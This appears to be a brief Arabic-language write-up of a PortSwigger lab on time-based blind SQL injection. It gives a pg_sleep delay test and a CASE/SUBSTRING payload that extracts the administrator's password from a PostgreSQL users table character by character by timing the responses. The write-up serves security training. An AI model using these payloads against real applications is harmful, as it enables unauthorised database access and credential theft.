# Lab: Blind SQL injection with time delays and information retrieval

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

- الفكره من الLab ده انك ترجع البيانات عن طريق التاخير الي بيجصل في الرد بس
- من غير error واضح او بيانات بترجع او اي حاجه بتظهر واضحه

```bash
1. '||pg_sleep(10)-- ==> ولا لا Delay احد طرق اختبار الموقع بشوف هل هيعمل 

2. '||(SELECT CASE WHEN (SUBSTRING(password,1,1)='s') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--  ==> time delay عنطريق  databaseده الكود الي هيقعد يتكرر الحاد اما اطلع كلمت السر من ال
```
